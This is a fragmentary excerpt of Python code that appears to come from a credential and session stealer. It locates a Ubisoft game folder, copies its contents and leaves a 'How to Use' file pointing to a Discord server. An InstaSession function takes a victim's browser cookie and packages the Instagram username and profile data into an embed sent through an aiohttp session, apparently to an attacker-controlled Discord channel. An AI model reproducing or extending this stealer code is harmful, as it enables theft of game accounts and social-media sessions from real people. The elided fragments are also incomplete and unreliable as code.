            ...
            if os.path.isdir(ubisoft_path):
                ...
                if found_ubisoft == True:
                    ...
                    with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("https://discord.gg/bH3CvNnqsg\n==============================================\n")
        ...
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    ...
                    "url" : "https://discord.gg/bH3CvNnqsg",
                    "color": 0,
                    "footer": {"text": "https://discord.gg/bH3CvNnqsgm | https://github.com/GanGbaY"},
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                ...
                "url" : "https://discord.gg/bH3CvNnqsg",
                "color": 0,
                "footer": {"text": "https://discord.gg/bH3CvNnqsg | https://github.com/GanGbaY"},
                "thumbnail": {"url": pp}
            }
            fields = [
                {"name": "Username", "value": "``" + username + "``", "inline": True},
